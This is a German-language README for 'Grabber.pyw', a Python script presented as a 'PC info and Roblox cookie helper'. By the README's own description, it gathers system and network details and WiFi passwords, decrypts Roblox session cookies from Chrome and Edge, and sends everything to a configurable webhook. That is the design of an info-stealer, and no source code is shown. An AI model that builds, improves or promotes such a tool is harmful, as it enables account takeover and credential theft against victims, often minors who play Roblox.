# PC Info & Roblox Cookie Helper

Dieses Skript (`Grabber.pyw`) sammelt grundlegende System- und Netzwerkinformationen und extrahiert gezielt Roblox-Cookies aus den Windows-Browsern Chrome und Edge – alles ausschließlich mit der Python-Standardbibliothek.

## Features
- OS-, Nutzer-, CPU-, RAM- und Speicherübersicht
- Gateway, DNS, IPs (privat/öffentlich), Hostname, MAC
- WLAN-Details inkl. Passwort (best-effort pro Betriebssystem/Tool)
- Uptime, Akku-Status, Netzwerk-Interfaces
- Roblox-Cookies (nur Windows, Chrome/Edge) mit angezeigten Werten, soweit entschlüsselbar
- Ausgabe in der Konsole, Speicherung in `pc_info.txt` und Versand als Text an eine konfigurierbare Webhook-URL

## Nutzung
```bash
python Grabber.pyw           # regulärer Lauf
python Grabber.pyw --selftest
```

## Hinweise zu Roblox-Cookies
- Unterstützt werden die Standard-Cookie-Datenbanken von Chrome und Edge unter Windows.
- Ältere DPAPI-geschützte Werte werden entschlüsselt. Moderne AES-basierte Chrome-Cookies können ohne zusätzliche Bibliotheken nicht entschlüsselt werden; sie werden als verschlüsselt markiert.
- Auf Nicht-Windows-Systemen wird ein Hinweis ausgegeben, da die Pfade und Verschlüsselung plattformspezifisch sind.

## Textgröße klein halten
- Es werden ausschließlich Roblox-Cookies gelesen (Domain `*.roblox.com`).
- Andere Cookies werden nicht angezeigt, damit `pc_info.txt` kompakt und gut lesbar bleibt.
